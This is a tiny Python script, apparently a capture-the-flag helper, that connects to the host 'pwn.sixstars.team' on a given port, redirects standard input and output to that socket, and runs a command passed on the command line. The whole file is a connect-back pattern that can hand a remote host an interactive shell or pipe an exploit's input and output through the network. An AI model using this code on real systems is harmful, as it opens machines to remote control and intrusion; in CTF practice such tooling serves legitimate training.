import sys
import os,socket,subprocess

port = int(sys.argv[1])
call = sys.argv[2:]

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('pwn.sixstars.team', port))

os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)

p=subprocess.call(call)